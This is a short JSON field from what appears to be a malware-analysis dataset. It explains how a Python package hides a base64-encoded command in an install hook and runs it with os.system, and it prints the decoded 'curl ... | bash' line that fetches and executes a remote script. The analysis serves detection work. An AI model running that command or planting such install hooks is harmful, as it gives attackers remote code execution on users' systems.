      "malicious_behavior": "The code contains malicious behavior. It defines a base64-decoding function that decodes an obfuscated shell command. This decoded command is executed via os.system during the package installation process (in the AfterInstall class's run method). The decoded command is: 'curl -s http://192.168.1.34:8000/test.txt | bash', which silently downloads a script from a hardcoded internal IP address and pipes it directly to bash for execution without any user interaction or consent. This is a classic supply chain attack pattern where arbitrary code is executed during package installation, enabling remote code execution and potential system compromise. The use of base64 encoding to hide the command, execution during install, hardcoded suspicious IP address, and execution of remote code without validation or notification are all strong indicators of malicious intent."
